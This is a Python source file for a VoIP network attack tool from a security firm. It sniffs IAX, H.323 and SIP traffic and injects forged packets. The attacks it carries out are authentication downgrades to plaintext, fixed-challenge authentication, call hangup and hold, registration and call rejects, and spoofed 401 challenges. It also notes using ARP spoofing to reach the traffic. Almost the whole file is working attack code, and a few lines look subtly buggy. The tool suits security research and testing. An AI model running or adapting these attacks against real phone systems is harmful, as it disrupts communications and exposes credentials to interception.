#!/usr/bin/env python
# vnak.py -- VoIP Network Attack Kit
# Written by Zane Lackey of iSEC Partners -- Copyright 2007 <c>
# Contact: zane@isecpartners.com
# http://www.isecpartners.com
#
# Requires:
# dpkt 1.6 -- http://dpkt.googlecode.com/files/dpkt-1.6.tar.gz
# PyCap 1.1 -- http://www.monkey.org/~dugsong/pypcap/pypcap-1.1.tar.gz
#
# Notes:
# - You need to be able to sniff traffic between the targets.
# If you can't, you'll first need to use a tool such as arpspoof to 
# get access to the traffic.
#

# The layout of our attack tuples
VOIP_PROTOCOL = 0
ATTACK_DESCRIPTION = 1
PCAP = 2
# Create the list of attacks we support
_vnak_attacks = []
_vnak_attacks.append(('IAX', 'Authentication Downgrade', 'udp and src port 4569 and dst port 4569 and ip[38]==6 and ip[39]==13'))
_vnak_attacks.append(('IAX', 'Known Authentication Challenge', 'udp and src port 4569 and dst port 4569 and ip[38]==6 and ip[39]==13'))
_vnak_attacks.append(('IAX', 'Call Hangup', 'udp and src port 4569 and dst port 4569 and ip[2:2]==40 and ip[38]==6 and ip[39]==2'))
_vnak_attacks.append(('IAX', 'Call Hold/Quelch', 'udp and src port 4569 and dst port 4569 and ip[2:2]==40 and ip[38]==6 and ip[39]==2'))
_vnak_attacks.append(('IAX', 'Registration Reject', 'udp and src port 4569 and dst port 4569 and ip[36]==1 and ip[37]==1 and ip[38]==6 and ip[39]==13'))
_vnak_attacks.append(('H.323', 'Registration Reject', 'udp and dst port 1719 and ether[42]==14 and ether[47]==0 and ether[48]==8 and ether[49]=145 and ether[50]==74 and ether[51]==0 and ether[52]==4'))
_vnak_attacks.append(('SIP', 'Registration Reject', 'udp and dst port 5060 and ether[42]==82 and ether[43]==69 and ether[44]==71 and ether[45]==73 and ether[46]==83 and ether[47]==84 and ether[48]==69 and ether[49]==82'))
_vnak_attacks.append(('SIP', 'Call Reject', 'udp and port 5060 and ether[54]==82 and ether[55]==105 and ether[56]==110 and ether[57]==103 and ether[58]==105 and ether[59]==110 and ether[60]==103'))
_vnak_attacks.append(('SIP', 'Known Authentication Challenge', 'udp and dst port 5060 and ether[42]==82 and ether[43]==69 and ether[44]==71 and ether[45]==73 and ether[46]==83 and ether[47]==84 and ether[48]==69 and ether[49]==82'))



import dpkt, pcap, socket
import sys, struct

def parse_options():
    
    import optparse, os

    usage_string = "%s [options] [-a attack_num] [client_ip_addr server_ip_addr]\n" % os.path.basename(sys.argv[0])
    i = 0
    usage_string += "Attack Number\tProtocol\tAttack Description\n"
    usage_string += "-------------\t--------\t------------------\n"

    for n in _vnak_attacks:
        usage_string += "%d\t\t%s\t\t%s\n" % (i, str(_vnak_attacks[i][VOIP_PROTOCOL]), str(_vnak_attacks[i][ATTACK_DESCRIPTION]))
        i += 1

    parser = optparse.OptionParser(usage=usage_string)
    parser.add_option("-i", help="Use specified interface", dest="iface", default="eth0")
    parser.add_option("-e", help="Attack every registration/call", dest="every_client", action="store_true", default=False)
    parser.add_option("-a", help="Use specified attack number", dest="attack", default=-1)


    opts, args = parser.parse_args()
    
    if opts.attack == -1 or len(args) < 1:   
        parser.error("Incorrect number of arguments.\n")

    return (opts, args)

def parse_packet(orig_pkt, attack):
    # Grab the lower level packet info
    orig_eth_frame = dpkt.ethernet.Ethernet(orig_pkt)
    orig_ip_hdr = orig_eth_frame.data
    orig_udp_hdr = orig_ip_hdr.data    

    # Build our generic packet. We reverse the src/dst (and ports) of the original packet
    pkt = dpkt.ip.IP(src=orig_ip_hdr.dst, dst=orig_ip_hdr.src, p=dpkt.ip.IP_PROTO_UDP, data=dpkt.udp.UDP(sport=orig_udp_hdr.dport, dport=orig_udp_hdr.sport))
    
    # Determine which attack we're performing and do the appropriate parsing/packet creation
    # Note that IAX packet creation is ugly because dpkt doesn't support it, so we build our
    # IAX packets by hand
    if attack == 0:
        # 0x80 indicates an IAX packet, while 0x01 is the static value that oseq
        # will be at this point in the authentication process. Therefore, build
        # it statically.
        scid = '\x80\x01'
        dcid = orig_pkt[42:44]
        timestamp = orig_pkt[46:50]
        # oseq stays the same, but iseq needs to be incremented by 1
        oseq = orig_pkt[50]
        iseq = chr(ord(orig_pkt[51]) + 1)
        userlen = orig_pkt[55]
        username = orig_pkt[56:(56 + int(ord(userlen)))]
        # An explanation of the hardcoded packet values:
        # 0x06 means the packet is of type IAX
        # 0x0E means the packet is of IAX Subclass REGAUTH
        # 0x16 means the IE id is Authentication Methods
        # 0x02 is the length of the Authentication Methods
        # 0x0001 is the list of Authentication Methods (just one, plaintext)
        # 0x06 means the IE id is Username
        pkt.data.data = scid + dcid + timestamp + oseq + iseq + '\x06\x0e\x0e\x02\x00\x01\x06' + userlen + username 
    elif attack == 1:
        # 0x80 indicates an IAX packet, while 0x01 is the static value that oseq
        # will be at this point in the authentication process. Therefore, build
        # it statically.
        scid = '\x80\x01'
        dcid = orig_pkt[42:44]
        timestamp = orig_pkt[46:50]
        # oseq stays the same, but iseq needs to be incremented by 1
        oseq = orig_pkt[50]
        iseq = chr(ord(orig_pkt[51]) + 1)
        userlen = orig_pkt[55]
        username = orig_pkt[56:(56 + int(ord(userlen)))]
        # An explanation of the hardcoded packet values:
        # 0x06 means the packet is of type IAX
        # 0x0E means the packet is of IAX Subclass REGAUTH
        # 0x0e-0x0f specify that what follows is a MD5 or RSA challenge
        challenge = "\x00"
        pkt.data.data = scid + dcid + timestamp + oseq + iseq + '\x06\x0e\x0e\x02\x00\x03\x0f' + len(challenge) + challenge + '\x06' + userlen + username 
    elif attack == 2:
        scid = '\x80' + orig_pkt[45]
        dcid = '\x00' + orig_pkt[43]
        timestamp = orig_pkt[46:50]
        # When we sleep and inject our packet, the expected sequence numbers
        # will be two ahead of our current values. Increment them acccordingly.
        oseq = chr(ord(orig_pkt[50]) + 2)
        iseq = chr(ord(orig_pkt[51]) + 2)
        # An explanation of the hardcoded packet values at the end of 'data':
        # 0x06 signifies that the packet is of type IAX
        # 0x05 signifies that it is of IAX Subclass HANGUP
        # 0x16 signifies that the cause IE id is Cause
        # 0x0b is a length of the cause
        # 0x44-0x6c ASCII for "Dumped Call"
        pkt.data.data = scid + dcid + timestamp + oseq + iseq + '\x06\x05\x16\x0b\x44\x75\x6d\x70\x65\x64\x20\x43\x61\x6c\x6c'
    elif attack == 3:
        scid = orig_pkt[42:44]
        dcid = orig_pkt[44:46]
        timestamp = orig_pkt[46:50]
        # When we sleep and inject our packet, the expected sequence numbers
        # will be two ahead of our current values. Increment them acccordingly.
        oseq = chr(ord(orig_pkt[50]) + 2)
        iseq = chr(ord(orig_pkt[51]) + 2)
        # An explanation of the hardcoded packet values at the end of 'data':
        # 0x06 signifies that the packet is of type IAX
        # 0x05 signifies that it is of IAX Subclass HANGUP
        # 0x16 signifies that the cause IE id is Cause
        # 0x0b is a length of the cause
        # 0x44-0x6c ASCII for "Dumped Call"
        pkt.data.data = scid + dcid + timestamp + oseq + iseq + '\x06\x1c\x1a\x00'
    elif attack == 4:
        # Scid, oseq, and iseq are static at this point in the negotiation
        scid = '\x80' + orig_pkt[45]
        dcid = '\x00' + orig_pkt[43]
        timestamp = orig_pkt[46:50]
        oseq = '\x01'
        iseq = '\x02'
        pkt.data.data = scid + dcid + timestamp + oseq + iseq + '\x06\x10\x16\x14\x52\x65\x67\x69\x73\x74\x72\x61\x74\x69\x6f\x6e\x20\x52\x65\x66\x75\x73\x65\x64\x2a\x01\x1d'
    elif attack == 5:
        orig_h225_hdr = orig_udp_hdr.data
        # Get the H225 sequence number, it is two bytes long and two bytes into the H225 header
        seqnum = orig_h225_hdr[2:4]     
        # Create the H225 values by hand with values as follows:
        # 0x1480 is a registrationReject
        # seqnum is the sequence number of the H225 request
        # 0x06 is the length of the H.225 identification sequence
        # 0x0008914a0004 is the sequence of bytes indicating a H.225 packet
        # 0x830100 is a securityDenial
        pkt.data.data = '\x14\x80' + seqnum + '\x06'+ '\x00\x08\x91\x4a\x00\x04' + '\x83\x01\x00' + '\x08\x00\x47\x00\x6e\x00\x75\x00\x47\x00\x6b'
    elif attack == 6:
        siphdr = orig_udp_hdr.data
        via = siphdr[(siphdr.find('Via')):]
        via = via[:(via.find('rport'))]
        via += "received=" + socket.inet_ntoa(pkt.dst) + ";rport=" + str(pkt.data.dport)
        sipfrom = siphdr[(siphdr.find('From')):]
        sipfrom = sipfrom[:(sipfrom.find('\x0d'))]
        sipto = siphdr[(siphdr.find('To')):]
        sipto = sipto[:sipto.find('\x0d')]
        sipto += ";tag=AAAAAAAAAA"
        callid = siphdr[(siphdr.find('Call')):]
        callid = callid[:(callid.find('\x0d'))]
        cseq = siphdr[(siphdr.find('CSeq')):]
        cseq = cseq[:(cseq.find('\x0d'))]
        sipstring = "SIP/2.0 403 Forbidden (Bad auth)"
        sipstring += "\x0d\x0a"
        sipstring += via
        sipstring += "\x0d\x0a"
        sipstring += sipfrom
        sipstring += "\x0d\x0a"
        sipstring += sipto
        sipstring += "\x0d\x0a"
        sipstring += callid
        sipstring += "\x0d\x0a"
        sipstring += cseq
        sipstring += "\x0d\x0a"
        sipstring += "Content-Length: 0"
        sipstring += "\x0d\x0a\x0d\x0a"
        pkt.data.data = sipstring
    elif attack == 7:
        # We build the packet different in this case, the src/dst aren't reversed
        pkt = dpkt.ip.IP(src=orig_ip_hdr.src, dst=orig_ip_hdr.dst, p=dpkt.ip.IP_PROTO_UDP, data=dpkt.udp.UDP(sport=orig_udp_hdr.sport, dport=orig_udp_hdr.dport))
        siphdr = orig_udp_hdr.data
        via = siphdr[(siphdr.find('Via')):]
        via = via[:(via.find('rport'))]
        via += "received=" + socket.inet_ntoa(pkt.dst) + ";rport=" + str(pkt.data.dport)
        sipfrom = siphdr[(siphdr.find('From')):]
        sipfrom = sipfrom[:(sipfrom.find('\x0d'))]
        sipto = siphdr[(siphdr.find('To')):]
        sipto = sipto[:sipto.find('\x0d')]
        sipto += ";tag=AAAAAAAAAA"
        callid = siphdr[(siphdr.find('Call')):]
        callid = callid[:(callid.find('\x0d'))]
        cseq = siphdr[(siphdr.find('CSeq')):]
        cseq = cseq[:(cseq.find('\x0d'))]
        sipstring = "SIP/2.0 480 Temporarily Unavailable"
        sipstring += "\x0d\x0a"
        sipstring += via
        sipstring += "\x0d\x0a"
        sipstring += sipfrom
        sipstring += "\x0d\x0a"
        sipstring += sipto
        sipstring += "\x0d\x0a"
        sipstring += callid
        sipstring += "\x0d\x0a"
        sipstring += cseq
        sipstring += "\x0d\x0a"
        sipstring += "Content-Length: 0"
        sipstring += "\x0d\x0a\x0d\x0a"
        pkt.data.data = sipstring
    elif attack == 8:
        siphdr = orig_udp_hdr.data
        via = siphdr[(siphdr.find('Via')):]
        via = via[:(via.find('rport'))]
        via += "received=" + socket.inet_ntoa(pkt.dst) + ";rport=" + str(pkt.data.dport)
        sipfrom = siphdr[(siphdr.find('From')):]
        sipfrom = sipfrom[:(sipfrom.find('\x0d'))]
        sipto = siphdr[(siphdr.find('To')):]
        sipto = sipto[:sipto.find('\x0d')]
        sipto += ";tag=AAAAAAAAAA"
        callid = siphdr[(siphdr.find('Call')):]
        callid = callid[:(callid.find('\x0d'))]
        cseq = siphdr[(siphdr.find('CSeq')):]
        cseq = cseq[:(cseq.find('\x0d'))]
        realm = "attackrealm"
        nonce = "12345678"
        sipstring = "SIP/2.0 401 Unauthorized"
        sipstring += "\x0d\x0a"
        sipstring += via
        sipstring += "\x0d\x0a"
        sipstring += sipfrom
        sipstring += "\x0d\x0a"
        sipstring += sipto
        sipstring += "\x0d\x0a"
        sipstring += callid
        sipstring += "\x0d\x0a"
        sipstring += cseq
        sipstring += "\x0d\x0a"
        sipstring += "WWW-Authenticate: Digest algorithm=MD5, realm=\"" + realm + "\", nonce=\"" + nonce + "\""
        sipstring += "\x0d\x0a"
        sipstring += "Content-Length: 0"
        sipstring += "\x0d\x0a\x0d\x0a"
        pkt.data.data = sipstring

    # Calculate the UDP and IP lengths
    pkt.data.ulen = len(pkt.data)
    pkt.len = len(pkt)

    send_packet(str(pkt), pkt.dst, pkt.data.dport, attack)

def send_packet(pkt, dst, dport, attack):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    sock.sendto(pkt, (socket.inet_ntoa(dst), dport)) 

    print("%s attack completed succesfully against host %s." % (_vnak_attacks[attack][ATTACK_DESCRIPTION], socket.inet_ntoa(dst)))


def main():
    print("\nvnak - VoIP Network Attack Kit")
    print("iSEC Partners, Copyright 2007 <c>")
    print("http://www.isecpartners.com")
    print("Written by Zane Lackey\n")

    opts, args = parse_options()
    opts.attack = int(opts.attack) 
    
    pc = pcap.pcap(opts.iface)


    if opts.every_client is True:
        pc.setfilter(_vnak_attacks[opts.attack][PCAP])
    else:
        targetted_client_string = 'src host %s and dst host %s and ' % (args[0], args[1])
        targetted_client_string += _vnak_attacks[opts.attack][PCAP] 
        pc.setfilter(targetted_client_string) 
    try:
        for ts, pkt in pc:
            parse_packet(pkt, opts.attack)
    except KeyboardInterrupt:
        print "Signal caught, exiting...\n"

if __name__ == '__main__':
    main()

